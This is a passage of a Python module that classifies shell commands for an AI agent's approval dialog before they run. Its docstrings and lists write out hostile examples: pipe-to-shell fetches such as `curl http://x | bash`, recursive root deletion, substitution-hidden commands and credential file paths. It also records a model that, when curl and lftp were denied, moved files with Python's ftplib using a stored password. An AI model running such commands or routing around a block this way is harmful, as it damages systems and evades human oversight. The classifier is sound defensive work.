# SPDX-FileCopyrightText: 2026 Veyllo GmbH
# SPDX-License-Identifier: AGPL-3.0-or-later
# Additional permissions and terms under AGPL Section 7: see LICENSING.md
"""Offline classification of a shell command, before anything runs.

Replaces a substring blocklist that was wrong in both directions: measured on
the old implementation, `curl http://x | bash`, `wget http://x -O- | sh`,
`rm  -rf  /` and `$(echo rm) -rf /` all passed, while `rm -rf /tmp/scratch`
was refused because the string contains `rm -rf /`.

The classifier tokenizes quote-aware, splits on the shell's own separators,
reads command substitutions as commands of their own, strips transparent wrappers,
and then judges the executable and its arguments. The verdict is DATA (categories +
segments), so the confirmation dialog can show WHY a command is flagged
instead of only that it is.

Three profiles, because the lanes have different confinement:
- ``host``   - vaf/tools/host_bash.py runs unsandboxed on the machine, with
  the whole environment. Its only other control is the human approval, so the
  catastrophic set is refused outright.
- ``jailed`` - vaf/tools/bash.py runs under bubblewrap (--clearenv,
  --unshare-net, repo and secrets unmounted) or a --network none container.
  Network fetches cannot reach anything, and wiping the throwaway workspace is
  ordinary work, so only what can hurt the machine or the jail root is refused.
- ``remote`` - a command that runs on ANOTHER machine, over ssh. Setting up a
  server routinely pipes an installer into a shell (the documented Docker
  install is `curl -fsSL https://get.docker.com | sh`), and refusing it there
  only teaches `curl -o f; sh f`, which passes. So the fetch-into-shell is
  named in the dialog but not refused; the catastrophic core still is.

A command can carry another command: `bash -c '...'`, `su -c '...'`, `eval ...`
and `ssh host '...'`. The inner text is classified too, the ssh one with the
``remote`` profile, and a refusal inside refuses the whole. Without that, every
refusal above was one `bash -c` away from passing (measured: ten of ten
wrapped forms went through). The nesting has a depth limit, and past it the
command is refused, because a reviewer cannot follow it either.

The command a project runner starts (`uv run`, `poetry run`, `conda run -n env`,
`uv tool run`) is classified the same way, as a local nested command, for every
category: before that, `uv run rm -rf /`, `uv run ssh host` and `uv run env python
-c 'import ftplib'` all passed while the same commands without the runner were
refused. So is the command a package runner starts: `npx`, `bunx` and `pnpx` directly,
`npm exec`, `pnpm exec`/`dlx`, `yarn exec`/`dlx`, `bun x` and `pipx run` only after
their verb, because their other subcommands (`npm install`, `npm run build`) start
nothing of their own (_PACKAGE_RUNNERS). The words after a runner's command are that
command's data; the word after a runner option is read as a possible value and a
possible command (`_runner_commands`, named boundaries there).

A command substitution (`$(...)`, a backtick pair), a subshell `( ... )` and a process
substitution (`<(...)`, `>(...)`) are commands the segment CARRIES: each is classified as
a local nested command of its own, and the segment keeps its text around it, with a mark
where a command substitution stood (_SUBST_BARE, or _SUBST_QUOTED inside double quotes).
A mark in the program word makes the command `opaque_command` wherever that word stands,
after a wrapper, a `VAR=` prefix or a runner as at the start; in a text a shell parses
again (`bash -c "..."`, `eval "..."`) a quoted mark counts as a bare one. A subshell or a
substitution reads the pipe like the command it stands in (`curl x | (bash)`), and a
process substitution that fetches hands its command fetched code (`bash <(curl x)`), as a
`>( )` receives what its command writes (`curl x | tee >(bash)`). A shell that runs another
command's output (`eval "$(...)"`, `source <(...)`, `bash <<< "$(...)"`, a descriptor fed
by one, _script_input) is `opaque_command` too, literal text fed to a shell is read as
shell text, and every opaque refusal names the way out for its shape (_OPAQUE_REASONS).
Every `$((` is read both ways, as arithmetic and as a command, since a `#` comment or a
backtick moves where bash closes it. A word-initial `#` is a comment to the end of the line,
and a heredoc body is data up to its delimiter (an unquoted one's substitutions run).
Every reading spends from one budget per call (MAX_NESTED_COMMANDS), and a runner's
candidates and the readings of a `$((`, each nearly the whole text again, from a second
one in characters (_RUNNER_TEXT_SLACK); the fork-bomb search is three plain searches. The
work stays linear in the command's length.

NAMED BOUNDARY: the shell's compound grammar is not read at the top level: brace groups
(`curl x | { bash; }`), `if`/`for`/`while`/`case`, variables and `${...}` as the program,
ANSI-C quoting (`$'...'`), globs and brace expansion in the program name, line continuation
inside a word, and wrappers that take a command string of their own (`env -S`, `watch`,
`find -exec`). Literal text piped into a shell by another command (`echo '...' | bash`) is
not read. Arithmetic evaluates an array subscript held in a variable as code
(`x='a[$(...)]'; echo $((x))`, `printf -v 'a[$(...)]' v`), which the text does not show.
A `case` statement inside a substitution refuses the command, since its pattern's `)`
would close the substitution early; the word "case" elsewhere does not.

Python that moves files over FTP is the same `ftp_transfer` as an FTP client
(`python_code_categories`): an import of ftplib, a string naming it (what
`__import__`, `importlib` or `-m` takes), an `ftp://`/`ftps://` address in the
code, or such code as a constant string handed to exec, eval or compile. One check
for both Python lanes: python_exec runs it on its code, and this classifier on
`python -c CODE` and `python -m ftplib` in a shell command (python, pypy, a
versioned or free-threaded name, Windows' py). Measured before it existed: a
model denied curl and lftp in host_bash wrote the same transfer with ftplib in
python_exec, reading the stored password from its environment.
NAMED BOUNDARY: the check reads the code it is given. Code built at runtime
(`"ftp" + "lib"`, a string assembled before exec), a script file, a heredoc or stdin
fed to the interpreter, or an interpreter started under another name or inside a
container is not seen, exactly as a shell script's content is not read. It points
at the right tool; the control for host code stays the confirmation and the
account opt-in.

This module lives in vaf/core, not next to the tools, because the confirmation
gate (vaf/core/tool_dispatch.py) renders the verdict: vaf/core importing
vaf/tools would point the dependency the wrong way round.

Stdlib-only on purpose - it is imported on the dispatch hot path.
"""
from __future__ import annotations

import re
import shlex
from dataclasses import dataclass, field
from typing import Iterable, List, Optional

# Executables that read a script from stdin: the sink half of "fetch | shell". `source`
# and `.` run a file as shell code, so `source <(curl ...)` is the same pipe.
_SHELL_SINKS = frozenset({
    "sh", "bash", "zsh", "dash", "ksh", "csh", "fish", "python", "python2",
    "python3", "perl", "ruby", "node", "php", "powershell", "pwsh", "source", ".",
})
# Executables that pull bytes off the network: the source half.
_NETWORK_FETCHERS = frozenset({
    "curl", "wget", "fetch", "aria2c", "http", "httpie", "nc", "ncat", "netcat",
})
# Wrappers that only decorate another command; the real executable follows.
_TRANSPARENT_WRAPPERS = frozenset({
    "sudo", "doas", "nohup", "time", "env", "command", "exec", "stdbuf",
    "nice", "ionice", "setsid", "timeout", "xargs", "builtin", "sshpass",
    "corepack",                     # `corepack pnpm dlx ...` runs the package manager named
    "!",                            # `! cmd` runs cmd and inverts its status
})
# A wrapper's options that take their value as the NEXT word. Without this the value
# was read as the executable: `sudo -u root rm -rf /` judged `root`, and passed.
_WRAPPER_VALUE_OPTIONS = {
    "sudo": {"-u", "-g", "-h", "-p", "-C", "-D", "-r", "-t", "-U", "-T",
             "--user", "--group", "--host", "--prompt", "--close-from", "--chdir",
             "--role", "--type", "--other-user", "--command-timeout"},
    "doas": {"-u", "-C"},
    "env": {"-u", "-C", "-S", "--unset", "--chdir", "--split-string"},
    "stdbuf": {"-i", "-o", "-e"},
    "nice": {"-n", "--adjustment"},
    "ionice": {"-c", "-n", "-p", "-P", "-u", "--class", "--classdata"},
    "timeout": {"-s", "-k", "--signal", "--kill-after"},
    "xargs": {"-a", "-d", "-E", "-e", "-I", "-i", "-L", "-l", "-n", "-P", "-s",
              "--arg-file", "--delimiter", "--max-args", "--max-procs", "--max-chars"},
    "sshpass": {"-p", "-f", "-d", "-P"},
}
# A wrapper whose first plain word is its own argument, not the command.
_WRAPPER_LEADING_ARGUMENT = frozenset({"timeout"})     # `timeout 5 cmd`: 5 is the duration

# Executables that run a command they are GIVEN AS TEXT; the text is classified too.
_COMMAND_STRING_SHELLS = frozenset({"sh", "bash", "zsh", "dash", "ksh"})
# Logging in to another machine with THIS computer's OpenSSH setup: its owner's ~/.ssh, its
# config and its agent, for whichever account runs the command, and a password prompt that
# lands on a terminal nobody sees. The host lane refuses it and points at the ssh tool, which
# keeps each account's own key and servers (vaf/core/ssh.py). `git` over ssh is not this.
_REMOTE_LOGINS = frozenset({"ssh", "scp", "sftp"})
# Moving files over FTP with this computer's own clients: the password stands on a command
# line every process can read, nobody is asked about a new server, and a certificate that
# changed goes unnoticed. The host lane refuses it and points at the ftp tool
# (vaf/core/ftp.py). curl and wget count when an argument is an ftp:// or ftps:// address.
_FTP_CLIENTS = frozenset({"ftp", "lftp", "ncftp", "ncftpput", "ncftpget", "tnftp", "pftp"})
# The address alone, or as an option's value (`--url=ftp://...`).
_FTP_URL_RE = re.compile(r"^(?:--?[A-Za-z][\w-]*=)?['\"]?ftps?://", re.IGNORECASE)
# The Python interpreter by name (`python`, `python3`, `python3.13`, the free-threaded
# `python3.13t`, PyPy's `pypy3`; Windows' `py` launcher).
_PYTHON_EXE_RE = re.compile(r"^(?:(?:python|pypy)(?:\d+(?:\.\d+)?)?t?|py)$")
# Project runners that start the command given as a later word (`uv run python -c ...`).
_PYTHON_RUNNERS = frozenset({"uv", "uvx", "poetry", "pipenv", "pdm", "hatch", "rye", "conda",
                             "pixi"})
# The words between a runner and its command that select what it does (`uv tool run`).
_RUNNER_VERBS = frozenset({"run", "exec", "tool"})
# Package runners, and the verbs after which they start a command. An empty set: the first
# plain word is the command (`npx eslint .`). Otherwise the runner starts a command only
# after one of its verbs (`npm exec`, `pnpm dlx`, `pipx run`); any other first plain word
# is the runner's own subcommand (`npm install`, `npm run build`, `yarn dev`). Read
# ungated, `npm -g install ssh` was a login to `ssh` (measured).
_PACKAGE_RUNNERS = {
    "npx": frozenset(), "bunx": frozenset(), "pnpx": frozenset(),
    "npm": frozenset({"exec", "x"}),
    "pnpm": frozenset({"exec", "dlx"}),
    "yarn": frozenset({"exec", "dlx"}),
    "bun": frozenset({"x", "exec"}),     # `bun exec '...'` runs a Bun Shell string
    "pipx": frozenset({"run"}),
    # Tool managers whose verb starts a command in their environment.
    "pyenv": frozenset({"exec"}), "opam": frozenset({"exec"}),
    "mamba": frozenset({"run"}), "micromamba": frozenset({"run"}),
}
# Builtins that run Python code they are given as a string: the string is read like the code.
_CODE_STRING_CALLS = frozenset({"exec", "eval", "compile"})
# How deep `exec("exec('...')")` is parsed; deeper code is searched as text.
_MAX_CODE_DEPTH = 4
# Python's short options that take a value besides -c and -m.
_PYTHON_VALUE_LETTERS = frozenset("WX")
# Code that does not parse is searched as text: the module name, or a quoted ftp:// address.
_PYTHON_FTP_TEXT_RE = re.compile(r"\bftplib\b|['\"]\s*ftps?://", re.IGNORECASE)
# ssh's single-letter options that take a value (ssh(1) synopsis).
_SSH_VALUE_LETTERS = frozenset("BbcDEeFIiJLlmOoPpQRSWw")
# How deep `bash -c "sh -c '...'"` may nest before the command is refused as unreadable.
MAX_NESTING = 4
# How many readings one top-level call makes in all before it is refused as unreadable. The
# top-level reading spends one of them too, so a command carries at most
# MAX_NESTED_COMMANDS - 1 = 63 nested commands, a substitution counting as one. The depth
# limit alone does not bound the work: a runner's command is read at
# every option's value position, and each such candidate that is a runner again branches
# anew, so `uv run -a uv -a uv ... python` grew with the 4th power of its length (measured:
# 30 options 2.4 s, 80 options over 300 s, on the gate path before anyone is asked).
MAX_NESTED_COMMANDS = 64
# Writes straight to a block device or formats one.
_DEVICE_WRITERS = frozenset({"dd", "mkfs", "fdisk", "parted", "sfdisk", "shred"})
# Reading these is a credential grab worth naming in the dialog.
_CREDENTIAL_PATHS = ("/etc/shadow", "id_rsa", "id_ed25519", ".aws/credentials",
                     ".ssh/", ".netrc", "credentials.json")

# Paths whose recursive removal is never ordinary work.
_PROTECTED_ROOTS = ("/", "/*", "/bin", "/boot", "/dev", "/etc", "/home", "/lib",
                    "/lib64", "/opt", "/proc", "/root", "/sbin", "/srv", "/sys",
                    "/usr", "/var", "~", "~/", "$HOME", "${HOME}", "c:\\", "c:/")

_WHITESPACE_RE = re.compile(r"\s+")
_DEVICE_TARGET_RE = re.compile(r"of=/dev/(sd|nvme|hd|vd|mmcblk|disk)", re.IGNORECASE)
_REDIRECT_DEVICE_RE = re.compile(r">\s*/dev/(sd|nvme|hd|vd|mmcblk|disk)", re.IGNORECASE)
# Where a command substitution stood in its segment (_split_segments). Bare, its output is
# split into words, so a word holding it anywhere can become any command; inside double
# quotes it stays one word, whose program name it supplies only when it stands in the last
# path component (`"$(git rev-parse --show-toplevel)/build.sh"` names build.sh).
_SUBST_BARE = "\x00"
_SUBST_QUOTED = "\x01"
# Where a process substitution `<(...)` or `>(...)` stood: one word, a file name.
_SUBST_PROC = "\x02"
# The text a runner's candidates may add up to, beyond the command's own length. Each
# candidate is the rest of the command joined back into text, so reading each of 64 value
# positions in full made `npx --x y --x y ...` cost 64 readings of the whole command
# (measured: 100 KB in 10 s, 1 MB in 78 s).
_RUNNER_TEXT_SLACK = 64 * 1024

CATEGORY_REASONS = {
    "pipe_to_shell": "downloads code from the network and pipes it into a shell",
    "device_write": "writes directly to a block device or formats a filesystem",
    "fork_bomb": "is a fork bomb",
    "destructive_removal": "recursively deletes a protected system or home path",
    "network_fetch": "fetches data from the network",
    "credential_read": "reads credential material",
    "history_rewrite": "discards uncommitted work or rewrites history",
    "opaque_command": "takes its program name from a command substitution, so the text being "
                      "approved is not the text that will run; run the substitution as a "
                      "command of its own first and write the program out (for "
                      "`\"$(which python3)\" -V`: `which python3`, then the path it prints, or "
                      "plain `python3 -V`)",
    "nested_too_deep": "carries more nested commands than anyone can review, or nests them "
                       "too deep; split it into several commands",
    "remote_login": "logs in to another machine with this computer's own SSH setup; use the "
                    "ssh tool, which keeps each account's key and servers apart and answers "
                    "the password prompt",
    "ftp_transfer": "moves files over FTP with this computer's own tools (an FTP client, curl "
                    "or Python's ftplib), with the password in the command or the code; use the "
                    "ftp tool, which asks before a new server, checks its certificate and keeps "
                    "the password out of every command",
}

# The other ways a command hides what runs, each with its way out (all `opaque_command`).
_OPAQUE_REASONS = {
    "shell_text": "runs shell text that another command prints, so the text being approved is "
                  "not the text that will run; use the tool's own direct form (`conda run -n "
                  "ENV ...`, `pyenv exec ...`, `direnv exec . ...`, `opam exec -- ...`, "
                  "`ssh-agent bash -c '...'`), or save the output to a file, read the file, "
                  "then run it (for an installer: `curl -fsSL -o install.sh URL`, then "
                  "`bash install.sh`)",
    "option_value": "hands a runner option a value from a command substitution, a word the "
                    "runner may also start as its program; write the value with `=` "
                    "(`--with=$(cat r)`)",
    "env_values": "takes its variables and program from a command substitution, so the text "
                  "being approved is not the text that will run; load a .env file with "
                  "`set -a; . ./.env; set +a; make`",
    "unreadable": "has a `case` statement inside a substitution, which this check cannot "
                  "read; write the case as a command of its own",
}

# What a refusal adds after the reason, where the reason alone names no way out. Only for a
# refusal: on the remote lane a fetch into a shell is a note, and the note stays as it is.
_WAY_OUT = {
    "pipe_to_shell": "; download it to a file, read the file, then run it "
                     "(`curl -fsSL -o install.sh URL`, then `bash install.sh`)",
}

# What each profile refuses outright. Everything else in CATEGORY_REASONS is a note.
_BLOCKING = {
    "host": ("fork_bomb", "device_write", "destructive_removal", "pipe_to_shell",
             "opaque_command", "nested_too_deep", "remote_login", "ftp_transfer"),
    # The jail has no network and its workspace is disposable; only what reaches the
    # machine or the jail root is refused.
    "jailed": ("fork_bomb", "device_write", "destructive_removal", "opaque_command",
               "nested_too_deep"),
    # Another machine: see the module docstring for why the fetch-into-shell is only named.
    "remote": ("fork_bomb", "device_write", "destructive_removal", "opaque_command",
               "nested_too_deep"),
}


@dataclass
class CommandVerdict:
    """What the classifier found. Data, so a dialog can explain it."""
    blocked: bool = False
    reason: str = ""
    categories: List[str] = field(default_factory=list)
    segments: List[str] = field(default_factory=list)
    # Which way of hiding the program made it `opaque_command` ("program", "shell_text",
    # "unreadable"), so the reason can name the way out.
    opaque_shape: str = field(default="", repr=False)

    @property
    def warning(self) -> str:
        """Human line for categories that are noteworthy but allowed."""
        if self.blocked or not self.categories:
            return ""
        named = [CATEGORY_REASONS[c] for c in self.categories if c in CATEGORY_REASONS]
        return f"Note: this command {', and '.join(named)}." if named else ""


def _split_segments(command: str) -> List[tuple]:
    """Split on shell separators OUTSIDE quotes; a substitution stays inside its command.

    Returns (connector, segment, carried) triples, where the connector says how a segment
    is joined to its predecessor: "pipe" only for a single `|`, everything else ("start",
    ";", "&&") breaks the pipeline. That distinction carries the whole pipe-to-shell
    judgement: `curl x | bash` is unreviewable, while `curl x > f; python parse.py` is a
    download followed by a separate, visible command (measured false positive of the first
    version).

    A substitution is a command the segment CARRIES, not a cut in it. Its text is returned
    whole, with its kind: "command" for `$( )` and backticks, "arithmetic" for a `$(( ))`
    that bash evaluates (the parenthesis after `$(` closes right before the outer one, and
    no `#` or backtick inside), "arithmetic*" for any other `$((`, "subshell" for `( )`,
    "process_in" for `<( )`, "process_out" for `>( )`. Where it stood in the segment a mark
    is left: _SUBST_BARE outside quotes, _SUBST_QUOTED inside double quotes, _SUBST_PROC for
    a process substitution (a file name), none for a subshell. Cutting the segment there, as
    before, separated the command word from its wrapper (`env $(echo rm) -rf /` became
    `env`, `echo rm` and `-rf /`, and passed) and broke a pipe in two (`curl x | tee
    $(mktemp) | bash` passed). A segment that has no text of its own but carries a
    substitution is kept: `(bash)`.

    A heredoc's body is carried too, never read as commands: "heredoc" for a body that is
    data (a quoted delimiter, or no substitution in it), "heredoc_x" for an unquoted body
    whose substitutions run (they are carried as "command" next to it). A word-initial `#`
    starts a comment that ends at the line. Before both, an apostrophe in a comment or in a
    heredoc body opened a quote that swallowed every later line (`cat <<'EOF'` with
    "don't" in it, then `rm -rf /`, passed), and a body was read as commands.

    A plain `command.split("|")` would be fooled by `echo "a|b"`, and a regex over the whole
    string never sees what a substitution actually runs.

    The quotes and backslashes STAY in the segment text, and shlex takes them off when the
    segment is tokenized. Dropping them here is what hid a nested command: `bash -c 'rm -rf
    /'` became the words `bash -c rm -rf /`, so the text that `-c` runs was no longer one
    argument anyone could look at.

    A substitution inside double quotes runs like one outside them. It is entered with the
    quote remembered on the stack and the quote restored when it closes; before, its
    closing `)` was read as quoted text, so `echo "$(rm -rf /)"` was judged as `rm -rf /)`
    and passed. An unclosed substitution takes the rest of the text.
    """
    segments: List[tuple] = []
    connector = "start"
    buf: List[str] = []
    subs: List[tuple] = []          # what the current segment carries
    sub_buf: List[str] = []         # the outermost open substitution's text
    sub_kind = ""
    sub_case = False                # a `case` statement inside the open substitution
    # The open `$((`: did its inner parenthesis close right before the outer one, and did a
    # `#` or a backtick (both of which change where bash closes it) appear inside?
    arith_closed, arith_clean, arith_tainted = False, False, False
    quote = ""       # active quote character, "" when outside quotes
    # Nesting of $( ), ( ) and ` `. A closer entered from inside double quotes is
    # stored with the quote in front ('")', '"`') so leaving it re-enters the quote.
    depth_stack: List[str] = []
    # Heredocs waiting for their body after the next newline: (delimiter, quoted,
    # strip_tabs, depth, segment), the segment being the command that reads the body.
    heredocs: List[tuple] = []
    i = 0
    n = len(command)

    def _put(text: str) -> None:
        (sub_buf if depth_stack else buf).append(text)

    def _last_char() -> str:
        target = sub_buf if depth_stack else buf
        for piece in reversed(target):
            if piece:
                return piece[-1]
        return ""

    def _open(closer: str, kind: str, opener: str) -> None:
        nonlocal sub_kind, sub_buf, sub_case, arith_closed, arith_clean, arith_tainted
        if depth_stack:
            sub_buf.append(opener)          # an inner one is part of the outer's text
            if sub_kind == "arithmetic" and opener == "`":
                arith_tainted = True
        else:
            sub_kind, sub_buf, sub_case = kind, [], False
            arith_closed, arith_clean, arith_tainted = False, False, False
            if kind in ("command", "arithmetic"):
                buf.append(_SUBST_QUOTED if closer.startswith('"') else _SUBST_BARE)
            elif kind in ("process_in", "process_out"):
                buf.append(_SUBST_PROC)
        depth_stack.append(closer)

    def _close(closer_text: str, nxt: str) -> bool:
        """True when the outermost substitution closed."""
        nonlocal quote, arith_closed, arith_clean, heredocs
        if depth_stack.pop().startswith('"'):
            quote = '"'
        if heredocs:
            heredocs = [h for h in heredocs if h[3] <= len(depth_stack)]
        if depth_stack:
            sub_buf.append(closer_text)
            if sub_kind == "arithmetic" and len(depth_stack) == 1 and not arith_closed:
                arith_closed, arith_clean = True, nxt == ")"
            return False
        _carry()
        return True

    def _carry() -> None:
        text = "".join(sub_buf).strip()
        if sub_case:
            # A `case` pattern's `)` closes the substitution here, early, and the commands
            # of its branch land outside it. Not read: refused as unreadable.
            subs.append(("unreadable", text))
            return
        kind = sub_kind
        if kind == "arithmetic" and not (arith_clean and not arith_tainted and depth_stack == []
                                         and text.endswith(")")):
            kind = "arithmetic*"
        subs.append((kind, text))

    def _flush() -> None:
        nonlocal buf, subs
        segments.append((connector, "".join(buf).strip(), subs))
        buf, subs = [], []

    def _heredoc_word(at: int) -> tuple:
        """The delimiter after `<<` at `at`: (end, delimiter, quoted, strip_tabs), or None
        when no word follows that can be one (`1<<2` in arithmetic is a shift)."""
        j = at + 2
        strip_tabs = command[j:j + 1] == "-"
        if strip_tabs:
            j += 1
        while j < n and command[j] in " \t":
            j += 1
        k, word, quoted = j, [], False
        while k < n and command[k] not in " \t\n;&|()<>":
            c = command[k]
            if c in ("'", '"'):
                close = command.find(c, k + 1)
                close = n if close < 0 else close
                word.append(command[k + 1:close])
                quoted, k = True, close + 1
                continue
            if c == "\\":
                word.append(command[k + 1:k + 2])
                quoted, k = True, k + 2
                continue
            word.append(c)
            k += 1
        delim = "".join(word)
        if not delim or not (quoted or delim[0].isalpha() or delim[0] == "_"):
            return None
        return k, delim, quoted, strip_tabs

    def _bodies(at: int) -> tuple:
        """Read the waiting heredocs' bodies after the newline at `at`: (end, [(body,
        quoted, segment)]), `end` at the newline after the last delimiter line (or the end)."""
        nonlocal heredocs
        pos, out = at + 1, []
        for delim, quoted, strip_tabs, _depth, _segment in heredocs:
            start = pos
            while True:
                if pos >= n:
                    out.append((command[start:n], quoted, _segment))
                    break
                e = command.find("\n", pos)
                end = n if e < 0 else e
                line = command[pos:end]
                if (line.lstrip("\t") if strip_tabs else line) == delim:
                    out.append((command[start:pos], quoted, _segment))
                    pos = end + 1 if e >= 0 else n
                    break
                pos = end + 1 if e >= 0 else n
        heredocs = []
        return (pos - 1 if 0 < pos <= n and command[pos - 1:pos] == "\n" else pos), out

    while i < n:
        ch = command[i]
        nxt = command[i + 1] if i + 1 < n else ""
        if quote:
            # Inside single quotes nothing is special; inside double quotes a
            # substitution still runs, so keep descending.
            if ch == "\\" and quote == '"':
                _put(ch)
                if nxt:
                    _put(nxt)
                    i += 2
                    continue
            if ch == quote:
                _put(ch)
                quote = ""
            elif quote == '"' and ch == "$" and nxt == "(":
                quote = ""
                _open('")', _dollar_kind(command, i), "$(")
                i += 2
                continue
            elif quote == '"' and ch == "`":
                quote = ""
                _open('"`', "command", "`")
            else:
                _put(ch)
            i += 1
            continue
        if ch == "#" and _last_char() in ("", " ", "\t", "\n", ";", "&", "|", "(", ")"):
            # A comment, to the end of the line: its quotes and parentheses are text.
            end = command.find("\n", i)
            end = n if end < 0 else end
            if depth_stack:
                sub_buf.append(command[i:end])
                if sub_kind == "arithmetic":
                    arith_tainted = True
            i = end
            continue
        if ch == "\n" and heredocs:
            end, bodies = _bodies(i)
            if depth_stack:
                sub_buf.append(command[i:end])  # read again where the substitution is read
            else:
                for body, quoted, segment in bodies:
                    # The body belongs to the command that wrote `<<`, also when a pipe
                    # follows it on that line (`cat <<EOF | bash`).
                    target = subs if segment >= len(segments) else segments[segment][2]
                    if quoted:
                        target.append(("heredoc", body))
                    else:
                        found = _heredoc_substitutions(body)
                        target.extend(found)
                        target.append(("heredoc_x" if found else "heredoc", body))
                _flush()
                connector = "seq"
            i = end
            continue
        if ch in ("'", '"'):
            _put(ch)
            quote = ch
            i += 1
            continue
        if ch == "\\" and nxt:
            _put(ch)
            _put(nxt)
            i += 2
            continue
        if (ch == "<" and nxt == "<" and command[i + 2:i + 3] != "<"
                and command[i - 1:i] != "<"):     # `<<<` is a here-string
            word = _heredoc_word(i)
            if word is not None:
                end, delim, quoted, strip_tabs = word
                heredocs.append((delim, quoted, strip_tabs, len(depth_stack), len(segments)))
                _put(command[i:end])
                i = end
                continue
        if ch == "$" and nxt == "(":
            _open(")", _dollar_kind(command, i), "$(")
            i += 2
            continue
        if ch == "`":
            if depth_stack and depth_stack[-1] in ("`", '"`'):
                _close("`", nxt)
            else:
                _open("`", "command", "`")
            i += 1
            continue
        if ch == "(":
            kind = "subshell"
            if not depth_stack and buf and buf[-1] in ("<", ">"):
                # `<(...)` and `>(...)`: the operator is the substitution's, not a redirect.
                kind = "process_in" if buf.pop() == "<" else "process_out"
            _open(")", kind, "(")
            i += 1
            continue
        if ch == ")" and depth_stack and depth_stack[-1] in (")", '")'):
            kind = sub_kind
            if _close(")", nxt) and kind == "subshell":
                # bash takes no words after a subshell, only a separator or a redirection:
                # what follows is read as a command of its own, never as the data of the
                # command in front (`echo (a) rm -rf /`).
                _flush()
                connector = "seq"
            i += 1
            continue
        if depth_stack:
            if ch == "c" and _CASE_STATEMENT_RE.match(command, i) and _command_position(sub_buf):
                sub_case = True
            _put(ch)                    # a separator inside a substitution is its own
            i += 1
            continue
        if ch in ";\n&|":
            _flush()
            # && and || are one separator, not two - and only a SINGLE | is a
            # pipe; || is sequencing like ; and &&.
            if nxt == ch:
                connector = "seq"
                i += 2
                continue
            connector = "pipe" if ch == "|" else "seq"
            i += 1
            continue
        buf.append(ch)
        i += 1
    if depth_stack:
        _carry()
    _flush()
    return [(c, seg, carried) for c, seg, carried in segments if seg or carried]


# `case WORD in`, the statement, not the word: `grep case f` and a commit message's "in
# that case" are no statement.
_CASE_STATEMENT_RE = re.compile(r"case\s+\S+\s+in(?=[\s;]|$)")
# Words after which the next word is a command.
_COMMAND_LEADERS = frozenset({"then", "do", "else", "elif", "{", "!", "time"})


def _command_position(sub_buf: List[str]) -> bool:
    """Whether the next word of a substitution's text stands where a command starts."""
    tail = "".join(sub_buf[-40:]).rstrip(" \t")
    if not tail or tail[-1] in ";&|(\n`":
        return True
    return tail.split()[-1] in _COMMAND_LEADERS


def _heredoc_substitutions(body: str) -> List[tuple]:
    """The substitutions an unquoted heredoc body runs. The body is read as the inside of
    double quotes: there too `$( )` and backticks run, a backslash escapes only `$`, a
    backtick, a backslash and a newline, and every other character is text. A `"` in the
    body is text, so it is escaped for that reading."""
    out: List[str] = []
    k = 0
    while k < len(body):
        c = body[k]
        if c == "\\":
            nx = body[k + 1:k + 2]
            if nx in ("$", "`", "\\", "\n") and nx:
                out.append("\\" + nx)
                k += 2
                continue
            out.append("\\\\")
            k += 1
            continue
        out.append('\\"' if c == '"' else c)
        k += 1
    found: List[tuple] = []
    for _connector, _seg, carried in _split_segments('"' + "".join(out) + '"'):
        found.extend(carried)
    return found


def _dollar_kind(command: str, i: int) -> str:
    """`$((` at `i` may open an arithmetic expansion, any other `$(` a command substitution.
    Whether bash evaluates it or runs it is not decided here: both readings are judged."""
    return "arithmetic" if command[i + 2:i + 3] == "(" else "command"


def _tokens(segment: str) -> List[str]:
    """shlex tokens, falling back to whitespace split on unbalanced quotes."""
    try:
        return shlex.split(segment, posix=True)
    except ValueError:
        return segment.split()


def _executable_at(tokens: List[str]) -> tuple:
    """(index, name) of the real executable: wrappers, their options (with the values
    those options take) and VAR=value prefixes are stepped over. (-1, "") for none."""
    wrapper = ""
    leading_argument_due = False
    i = 0
    while i < len(tokens):
        tok = tokens[i]
        # `curl.exe` and `ftp.exe` on a Windows host are curl and ftp: judged by the name
        # without the suffix, or every rule below was one `.exe` away from passing.
        base = _exe_base(tok)
        if not base:
            i += 1
            continue
        if tok.startswith("-"):
            # `-u root` takes the next word; `-uroot` and `--user=root` carry it along.
            if tok in _WRAPPER_VALUE_OPTIONS.get(wrapper, ()):
                i += 2
                continue
            i += 1
            continue
        if "=" in tok and tok.split("=", 1)[0].isidentifier():
            i += 1
            continue  # VAR=value prefix
        if leading_argument_due:
            leading_argument_due = False
            i += 1
            continue
        if base in _TRANSPARENT_WRAPPERS:
            wrapper = base
            leading_argument_due = base in _WRAPPER_LEADING_ARGUMENT
            i += 1
            continue
        return i, base
    return -1, ""


def _executable(tokens: List[str]) -> str:
    """The real executable's name (see _executable_at)."""
    return _executable_at(tokens)[1]


def _ssh_remote_command(args: List[str]) -> str:
    """What `ssh [options] host [command...]` runs on the other machine: every word after
    the host, joined with spaces - which is exactly how ssh itself builds it."""
    i = 0
    while i < len(args):
        tok = args[i]
        if tok == "--":
            i += 1
            break
        if not tok.startswith("-") or tok == "-":
            break
        # A cluster like `-tt`, `-4v` or `-p22`: the first value-taking letter consumes
        # the rest of the word, or the next word when it ends the cluster.
        takes_next = False
        for pos, letter in enumerate(tok[1:], start=1):
            if letter in _SSH_VALUE_LETTERS:
                takes_next = pos == len(tok) - 1
                break
        i += 2 if takes_next else 1
    return " ".join(args[i + 1:])     # args[i] is the host


def _reparsed(text: str) -> str:
    """A text a shell parses AGAIN: a substitution that was one quoted word here is split
    into words there, so its mark becomes the bare one (`bash -c "$(echo rm) -rf /"` runs
    `rm -rf /`, and `eval "$(...)"` runs whatever the substitution prints). A `\\$` or a
    backslashed backtick that double quotes kept here loses its backslash there, so it opens
    a substitution (`eval "\\$(echo rm) -rf /"` runs `rm -rf /`, measured)."""
    return (text.replace(_SUBST_QUOTED, _SUBST_BARE)
            .replace("\\$", "$").replace("\\`", "`"))


def _attached_call(word: str) -> Optional[str]:
    """The shell string of npm's `--call=TEXT`, `-c=TEXT` or `-cTEXT` written in one word,
    else None. npm and npx run `--call=TEXT` and `-c=TEXT` through a shell like the spaced
    `-c TEXT` (measured with an echo); `-cTEXT` they do not run (npm warns of an unknown
    config), and reading it too costs nothing."""
    if word.startswith("--call="):
        return word[len("--call="):]
    if word.startswith("-c") and len(word) > 2:
        return word[3:] if word[2] == "=" else word[2:]
    return None


def _runner_text(args: List[str], start: int) -> str:
    """The command a runner starts at `args[start]`, as text. A first word that holds
    whitespace is a shell string (`npx -c 'rm -rf /'`, `npm exec -c '...'`: npm's `--call`
    and pnpm's shell mode run it through a shell), so it is taken raw; joined back with
    shlex it stayed one word, a program nobody has, and passed (measured). An attached
    `--call=TEXT` or `-cTEXT` (_attached_call) is such a string too."""
    first = args[start]
    attached = _attached_call(first) if first.startswith("-") else None
